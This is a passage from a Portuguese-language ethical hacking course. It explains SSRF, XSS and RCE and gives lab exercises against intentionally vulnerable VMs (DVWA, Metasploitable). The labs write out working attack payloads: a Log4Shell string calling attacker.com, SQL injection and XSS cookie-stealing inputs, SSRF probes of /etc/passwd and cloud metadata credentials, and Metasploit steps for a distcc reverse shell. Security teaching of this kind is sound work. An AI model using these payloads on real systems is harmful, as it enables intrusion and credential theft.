GCP, Azure), os provedores geralmente expõem um endpoint de metadados local
(ex: http://169.254.169.254/ ) que contém informações sensíveis sobre a
instância, como credenciais temporárias. Um atacante pode usar SSRF para
acessar esse endpoint e roubar credenciais.
Acesso a Arquivos Locais: Em alguns casos, a vulnerabilidade SSRF pode ser
explorada para ler arquivos locais no servidor usando esquemas de URL como
file:///etc/passwd ou file:///C:/Windows/System32/drivers/etc/hosts .
Ferramentas Comuns: Burp Suite (Repeater), curl.
4. Cross-Site Scripting (XSS)
Descrição: XSS é uma vulnerabilidade de segurança web que permite a um atacante
injetar scripts maliciosos (geralmente JavaScript) em páginas web visualizadas por
outros usuários. Isso ocorre quando uma aplicação web não valida ou sanitiza
adequadamente a entrada do usuário antes de exibi-la na página. Os scripts injetados
podem roubar cookies de sessão, redirecionar usuários para sites maliciosos, ou até
mesmo reescrever o conteúdo da página [12].
Tipos de XSS:
Reflected XSS (Não Persistente): O script malicioso é refletido de volta para o
navegador do usuário a partir da requisição HTTP. O atacante precisa enganar a
vítima para clicar em um link malicioso que contém o payload XSS.
Cenário de Exploração: Um atacante envia um link para a vítima como
https://site.com/busca?query=<script>alert('XSS')</script> . Se a
aplicação refletir o parâmetro query diretamente na página sem
sanitização, o script será executado no navegador da vítima.
Stored XSS (Persistente): O script malicioso é armazenado no servidor (ex: em
um banco de dados) e é exibido para outros usuários sempre que eles acessam a
página afetada. Este é o tipo mais perigoso de XSS, pois não requer interação
direta da vítima com um link malicioso.
Cenário de Exploração: Um atacante posta um comentário em um blog
que contém um payload XSS. Quando outros usuários visualizam o
comentário, o script é executado em seus navegadores.

DOM-based XSS: A vulnerabilidade reside no código JavaScript do lado do
cliente, que manipula o DOM (Document Object Model) de forma insegura,
usando dados controlados pelo atacante.
Ferramentas Comuns: Navegador web (console de desenvolvedor), Burp Suite
(Intruder, Repeater).
5. Remote Code Execution (RCE) - Execução Remota de Código
Descrição: RCE é uma das vulnerabilidades mais críticas, permitindo que um atacante
execute código arbitrário no servidor remoto. Isso pode levar ao controle total do
sistema, roubo de dados, instalação de malware ou uso do servidor para lançar outros
ataques. RCE pode ser o resultado da exploração de outras vulnerabilidades, como
injeção de comando, desserialização insegura, ou falhas em componentes de software
desatualizados [15].
Cenário de Exploração:

Injeção de Comando: Como visto anteriormente, uma injeção de comando bem-
sucedida pode levar a RCE se o atacante conseguir executar comandos

arbitrários no sistema operacional.
Desserialização Insegura: Aplicações que desserializam dados de fontes não
confiáveis podem ser vulneráveis a RCE. Um atacante pode criar um objeto
serializado malicioso que, quando desserializado, executa código arbitrário no
servidor.
Vulnerabilidades em Componentes de Software: Muitas vezes,
vulnerabilidades em bibliotecas ou frameworks de terceiros podem levar a RCE.
Um exemplo notável foi a vulnerabilidade Log4Shell (CVE-2021-44228) na
biblioteca Apache Log4j, que permitiu a execução remota de código em inúmeros
sistemas globalmente [16].
Exemplo de Exploração (Log4Shell simplificado):
Um atacante pode enviar uma string maliciosa para um campo de entrada que é
logado pela aplicação, como:

${jndi:ldap://attacker.com/a}

Se a aplicação usar uma versão vulnerável do Log4j, ela tentará resolver essa string via
JNDI (Java Naming and Directory Interface) para o servidor LDAP do atacante. O
servidor LDAP do atacante pode então retornar uma classe Java maliciosa que é
executada no servidor da vítima, resultando em RCE.
Ferramentas Comuns: Metasploit Framework, Burp Suite, ferramentas de engenharia
reversa.

Referências

[12] Medium. OWASP Top 10 Vulnerabilities: What They Are, Examples, And Testing
Tips. Disponível em: https://medium.com/@Sle3pyHead/owasp-top-10-
vulnerabilities-what-they-are-examples-and-testing-tips-efdbd4edab38
[13] OWASP Foundation. A01 Broken Access Control - OWASP Top 10:2021. Disponível
em: https://owasp.org/Top10/2021/A01_2021-Broken_Access_Control/
[14] OWASP Foundation. A10 Server Side Request Forgery (SSRF) - OWASP Top

10:2021. Disponível em: https://owasp.org/Top10/2021/A10_2021-Server-
Side_RequestForgery%28SSRF%29/

[15] Cycode. Application Security Vulnerabilities to Watch out for in 2026. Disponível
em: https://cycode.com/blog/application-security-vulnerabilities/
[16] SC Magazine UK. The 4 Worst Vulnerabilities of 2025 – And How To Boost Patch

Management in 2026. Disponível em: https://insight.scmagazineuk.com/the-4-worst-
vulnerabilities-of-2025-and-how-to-boost-patch-management-in-2026

Laboratórios Práticos Adicionais: Exploração de
Vulnerabilidades
Estes laboratórios práticos complementam o Módulo 5, permitindo que os alunos
apliquem as técnicas de exploração de vulnerabilidades em ambientes controlados. É
altamente recomendável a utilização de máquinas virtuais (Kali Linux, Metasploitable,
DVWA - Damn Vulnerable Web Application, ou outras aplicações web vulneráveis) para
a realização destes exercícios.

Requisitos para os Laboratórios:
Ambiente de Virtualização: VMware Workstation Player, VirtualBox ou Hyper-V.
Máquinas Virtuais:
Kali Linux: Para as ferramentas de ataque.
Metasploitable
2
⁄3
: Máquina virtual intencionalmente vulnerável.
DVWA (Damn Vulnerable Web Application): Uma aplicação web
PHP/MySQL vulnerável, ideal para praticar SQLi, XSS, CSRF, etc. Pode ser
instalada no Metasploitable ou em uma VM Linux separada.
Outras VMs Vulneráveis: Como WebGoat, bWAPP, ou VMs específicas para
RCE (ex: com Log4j vulnerável).

Módulo 5: Exploração de Vulnerabilidades na Prática
Laboratório 5.1: SQL Injection (SQLi) em DVWA
Objetivo: Explorar vulnerabilidades de SQL Injection para bypassar autenticação e
extrair dados.
Cenário: Utilizar a funcionalidade de login e busca da DVWA para realizar ataques de
SQLi.
Ferramentas: Navegador web, Burp Suite (opcional), sqlmap (opcional).
Passos:

1. Configuração da DVWA: Certifique-se de que a DVWA está instalada e
configurada (nível de segurança baixo).
2. Bypass de Autenticação (Login):
Acesse a página de login da DVWA.
No campo de usuário, tente admin' OR '1'='1 e qualquer senha.
Observe o resultado. Explique por que funcionou.
3. Extração de Dados (Busca):
Acesse a funcionalidade de busca de usuários na DVWA.
No campo de busca, tente 1' UNION SELECT user, password FROM
users;-- .

Observe os nomes de usuário e senhas (hashes) retornados. Explique o que
aconteceu.
4. SQLi Baseada em Erro (Opcional): Experimente payloads que causem erros SQL
para obter informações.
5. Uso do sqlmap (Opcional): Use o sqlmap a partir do Kali Linux para
automatizar a exploração de SQLi na DVWA. Ex: sqlmap -u
"http://[IP_DVWA]/vulnerabilities/sqli/?id=1&Submit=Submit#" --dbs .
Laboratório 5.2: Cross-Site Scripting (XSS) em DVWA
Objetivo: Injetar e executar scripts maliciosos em uma aplicação web.
Cenário: Utilizar as funcionalidades de “Guestbook” e “Reflected XSS” da DVWA para
demonstrar ataques XSS.
Ferramentas: Navegador web.
Passos:

1. Reflected XSS:
Acesse a página de Reflected XSS na DVWA.
No campo de entrada, insira <script>alert('XSS Refletido!')
</script> .
Observe o pop-up. Explique como o script foi executado.
Tente roubar cookies: <script>alert(document.cookie)</script> .
2. Stored XSS:
Acesse a página de Guestbook na DVWA.
No campo de mensagem, insira <script>alert('XSS Armazenado!')
</script> e envie.
Recarregue a página e observe o pop-up. Explique a diferença entre XSS
refletido e armazenado.
Tente um payload mais avançado, como um keylogger simples (apenas
para fins educacionais, não execute em sistemas reais).

Laboratório 5.3: Broken Access Control (IDOR e Forced Browsing)
Objetivo: Explorar falhas de controle de acesso para acessar recursos não autorizados.
Cenário: Simular uma aplicação web com perfis de usuário e área administrativa,
buscando falhas de IDOR e navegação forçada.
Ferramentas: Navegador web, Burp Suite (Repeater).
Passos:

1. IDOR (Insecure Direct Object Reference):
Em uma aplicação web de teste (ex: DVWA com nível de segurança
médio/alto, ou uma aplicação customizada), crie dois usuários: usuarioA e
usuarioB .
Faça login como usuarioA e acesse a página de perfil ou de visualização de
pedidos, observando a URL (ex: https://app.com/perfil?id=1 ).
Altere o id na URL para 2 (correspondente a usuarioB ). Se você
conseguir visualizar o perfil de usuarioB , a aplicação é vulnerável a IDOR.
Use o Burp Suite Repeater para automatizar a alteração de IDs e verificar o
acesso.
2. Forced Browsing:
Faça logout da aplicação.
Tente acessar URLs que deveriam ser restritas a usuários logados ou
administradores (ex: /admin , /dashboard_admin , /settings_privadas ).
Observe se a aplicação redireciona para a página de login ou se permite o
acesso indevido.

Laboratório 5.4: Server-Side Request Forgery (SSRF)
Objetivo: Utilizar o servidor da aplicação para fazer requisições internas ou externas
não autorizadas.
Cenário: Explorar uma funcionalidade de “carregar imagem de URL” ou “verificar
status de URL” em uma aplicação web vulnerável.
Ferramentas: Navegador web, Burp Suite (Repeater), curl.

Passos:

1. Identificação da Vulnerabilidade: Encontre uma funcionalidade na aplicação
que aceite uma URL como entrada e faça uma requisição a ela (ex: um serviço de
encurtador de URL, um validador de RSS, um carregador de avatar).
2. Acesso a Arquivos Locais: Tente fornecer URLs como file:///etc/passwd ou
file:///C:/Windows/System32/drivers/etc/hosts .
Observe se o conteúdo do arquivo é retornado ou se há alguma indicação
de que o servidor tentou acessar o arquivo.
3. Port Scan Interno: Tente fornecer URLs para portas comuns em localhost ou
em um IP interno (ex: http://127.0.0.1:22 , http://127.0.0.1:80 ,
http://127.0.0.1:3306 ).
Observe as diferenças no tempo de resposta ou nas mensagens de erro
para inferir o status das portas.
4. Acesso a Metadados de Nuvem (se aplicável): Se a aplicação estiver hospedada
em um ambiente de nuvem, tente acessar o endpoint de metadados (ex:
http://169.254.169.254/latest/meta-data/ ).
Analise as informações retornadas, que podem incluir credenciais
temporárias ou informações de configuração da instância.

Laboratório 5.5: Remote Code Execution (RCE) - Exploração com Metasploit
Objetivo: Obter uma shell remota no sistema alvo através da exploração de uma
vulnerabilidade RCE.
Cenário: Utilizar o Metasploit Framework para explorar uma vulnerabilidade RCE
conhecida em uma máquina virtual (ex: Metasploitable
2
⁄3
).

Ferramentas: Kali Linux, Metasploit Framework.
Passos:

1. Identificação da Vulnerabilidade: Escolha uma vulnerabilidade RCE conhecida
na Metasploitable (ex: apache_mod_cgi_bash_env_exec , distcc_exec , ou uma
vulnerabilidade em um serviço web específico).
2. Iniciar Metasploit: No Kali Linux, abra o msfconsole .
3. Pesquisar e Selecionar Exploit: Use search [nome_da_vulnerabilidade] para
encontrar o exploit apropriado. Ex: search distcc .
4. Configurar Exploit:
use exploit/unix/misc/distcc_exec (exemplo para distcc).
set RHOSTS [IP_Metasploitable] .
set LHOST [IP_Kali] (seu endereço IP no Kali Linux).
set LPORT 4444 (porta para a shell reversa).
show options para verificar as configurações.
5. Executar Exploit: exploit ou run .
6. Pós-Exploração: Se o exploit for bem-sucedido, você obterá uma shell no
sistema alvo. Execute comandos como whoami , ls -la , pwd para confirmar o
acesso e explorar o sistema.
Estes laboratórios fornecem uma experiência prática inestimável, permitindo que os
alunos não apenas compreendam as vulnerabilidades, mas também desenvolvam as
habilidades necessárias para identificá-las e explorá-las de forma ética, a fim de
proteger sistemas e dados.
